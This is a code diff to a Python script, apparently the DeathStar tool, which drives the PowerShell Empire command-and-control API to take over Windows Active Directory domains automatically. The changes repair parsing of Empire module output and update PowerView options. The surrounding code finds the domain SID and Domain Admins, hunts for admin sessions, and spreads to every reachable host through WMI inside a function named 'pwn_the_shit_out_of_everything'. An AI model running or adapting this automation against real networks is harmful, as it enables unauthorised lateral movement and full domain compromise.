@@ -29,6 +29,7 @@ from argparse import RawTextHelpFormatter
 from time import sleep
 from requests import ConnectionError
 
+
 # The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -175,12 +176,25 @@ def execute_module_with_results(module_name, agent_name, module_options=None):
     r = execute_module(module_name, agent_name, module_options)
     while True:
         for result in get_agent_results(agent_name)['results']:
-            for entry in result['AgentResults']:
-                if entry['taskID'] == r['taskID']:
-                    if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
-                    return entry['results']
-        sleep(2)
+            done = False
+            if len(result) > 0:
+                for entry in result['AgentResults']:
+                    if entry['taskID'] == r['taskID']:
 
+                        # Here we fix a bunch of stuff because Empire does not give standard output for all modules
+                        # This is for get_domain_sid because Empire doesn't have a "completed" string when its done
+                        if module_name == 'powershell/management/get_domain_sid':
+                            if 'S-1-5-21' in entry['results']:
+                                done = True
+
+                        # Empire returns "Job started: xxxxxx" as results but we need just the completed results
+                        if ' completed' in entry['results']:
+                            done = True
+
+                        if done == True:
+                            if debug: print_debug('Result Buffer: {}'.format(entry), agent_name)
+                            return entry['results']
+        sleep(2)
 
 def get_agent_logged_events(agent_name):
     r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
@@ -210,13 +224,18 @@ def delete_all_agent_results():
 
 def get_domain_sid(agent_name):
     results = execute_module_with_results('powershell/management/get_domain_sid', agent_name)
+    # results = Job started: XXXXXXS-1-5-... because Empire is missing \r\n after "Job started"
+    if results.startswith('Job started: '):
+        results = results[19:].strip()
+    # This is here in case Empire fixes their shit and adds in the correct \r\n between Job started and the output
+    else:
+        results = results.split()[1]
     print_good('Got domain SID: {}'.format(results), agent_name)
     return results
 
 
-def get_group_member(agent_name, group_sid='', group_name='', recurse=True):
-    module_options = {'GroupName': group_name,
-                      'SID': group_sid,
+def get_group_member(agent_name, group_sid, recurse=True):
+    module_options = {'Identity': group_sid,
                       'Recurse': str(bool(recurse))}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_group_member', agent_name, module_options)
@@ -226,11 +245,6 @@ def get_group_member(agent_name, group_sid='', group_name='', recurse=True):
         user = None
         domain = None
         for entry in result.split('\r\n'):
-            if entry.startswith('IsGroup'):
-                is_group = bool(entry.split(':')[1].strip())
-                if is_group:
-                    continue
-
             if entry.startswith('MemberDomain'):
                 domain = entry.split(':')[1].strip().split('.')[0].upper()
             if entry.startswith('MemberName'):
@@ -256,10 +270,8 @@ def get_domain_controller(agent_name):
     return dcs
 
 
-def user_hunter(agent_name, group_name='"Domain Admins"', threads=20, no_ping=False):
-    module_options = {'GroupName': group_name,
-                      'Threads'  : str(int(threads)),
-                      'NoPing'   : str(bool(no_ping))}
+def user_hunter(agent_name, threads):
+    module_options = {'Threads': str(threads)}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/user_hunter', agent_name, module_options)
     results = results.strip().split('\r\n\r\n')[:-2]
@@ -284,16 +296,21 @@ def user_hunter(agent_name, group_name='"Domain Admins"', threads=20, no_ping=Fa
     return admin_sessions
 
 
-def find_localadmin_access(agent_name, threads=20, no_ping=False, computer_name=''):
-    module_options = {'ComputerName': computer_name,
-                      'Threads': str(int(threads)),
-                      'NoPing': str(bool(no_ping))}
+def find_localadmin_access(agent_name, computer_name=''):
+    module_options = {'ComputerName': computer_name}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
     results = results.strip().split('\r\n')
 
+    # Empire prints the results as: "Job started: ABCDEFwindows10.lab.local\r\nwindows11.lab.local\r\n\n\r\n\n
+    fixed_results = []
+    for r in results:
+        if r.startswith('Job started: '):
+            r = r[19:]
+        fixed_results.append(r)
+
     # Deletes the '\nFind-LocalAdminAccess completed!' string and a rogue '\n'
-    results = results[:-2]
+    results = fixed_results[:-2]
 
     if not computer_name:
         print_good('Current security context has admin access to {} hosts'.format(len(results)), agent_name)
@@ -307,7 +324,7 @@ def find_localadmin_access(agent_name, threads=20, no_ping=False, computer_name=
 
 
 def get_gpo_computer(agent_name, GUID):
-    module_options = {'GUID': GUID}
+    module_options = {'ComputerIdentity': GUID}
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_gpo_computer', agent_name, module_options)
     results = results.strip().split('\r\n')
 
@@ -491,7 +508,8 @@ def recon(agent_name):
         print_info('Starting recon', agent_name)
 
         domain_sid = get_domain_sid(agent_name)
-        for member in get_group_member(agent_name, group_sid=domain_sid + '-512'):
+        DA_group_sid = domain_sid + '-512'
+        for member in get_group_member(agent_name, DA_group_sid):
             with lock:
                 domain_admins.append(member)
 
@@ -502,7 +520,7 @@ def recon(agent_name):
         if not domain_admins and not domain_controllers:
             print_bad('Could not find Domain Admins and Domain Controllers. This usually means something is wrong with the Agent.')
 
-        for session in user_hunter(agent_name, no_ping=True, threads=args.threads):
+        for session in user_hunter(agent_name, args.threads):
             with lock:
                 if session['hostname'] not in priority_targets:
                     priority_targets.append(session['hostname'])
@@ -525,10 +543,10 @@ def spread(agent_name):
 
             print_info('Starting lateral movement', agent_name)
             for box in priority_targets:
-                if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
+                if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, computer_name=box):
                     invoke_wmi(agent_name, box)
 
-            for box in find_localadmin_access(agent_name, no_ping=True, threads=args.threads):
+            for box in find_localadmin_access(agent_name):
                 # Do we have an agent on the box? if not pwn it
                 if not agent_on_host(hostname=box):
                     invoke_wmi(agent_name, box)
@@ -564,7 +582,6 @@ def pwn_the_shit_out_of_everything(agent_name):
     '''
     This is the function that takes care of the logic for each agent thread
     '''
-
     if (not domain_controllers or not domain_admins) and not recon_threads:
         recon_threads[agent_name] = agent_name
         recon(agent_name)
